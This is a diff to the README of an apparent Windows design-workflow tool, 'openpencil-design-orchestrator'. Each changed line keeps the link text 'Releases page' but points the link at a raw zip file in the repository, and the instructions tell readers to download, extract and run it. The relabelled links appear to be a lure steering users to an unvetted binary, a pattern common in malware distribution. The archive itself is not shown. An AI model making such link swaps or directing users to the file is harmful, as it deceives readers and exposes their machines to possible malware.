@@ -1,10 +1,10 @@
 # 🛠️ openpencil-design-orchestrator - Simple design workflows, safer edits
 
-[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/raw/refs/heads/main/dist/openpencil-design-orchestrator-1.8-alpha.5.zip)
 
 ## 📥 Download
 
-Go to the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases) and download the latest Windows package.  
+Go to the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/raw/refs/heads/main/dist/openpencil-design-orchestrator-1.8-alpha.5.zip) and download the latest Windows package.  
 After the file finishes downloading, open it and follow the prompts to run it on your PC.
 
 ## ✅ What this tool does
@@ -33,7 +33,7 @@ You should have:
 
 ## 🚀 How to install on Windows
 
-1. Open the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases)
+1. Open the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/raw/refs/heads/main/dist/openpencil-design-orchestrator-1.8-alpha.5.zip)
 2. Find the newest release at the top
 3. Download the Windows file listed there
 4. If the file is zipped, right-click it and choose Extract All
@@ -185,7 +185,7 @@ If a task stops halfway:
 
 ## 📦 Release downloads
 
-Use the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases) to visit the download page, get the latest Windows file, and run it on your machine
+Use the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/raw/refs/heads/main/dist/openpencil-design-orchestrator-1.8-alpha.5.zip) to visit the download page, get the latest Windows file, and run it on your machine
 
 ## 🏷️ Project topics
 
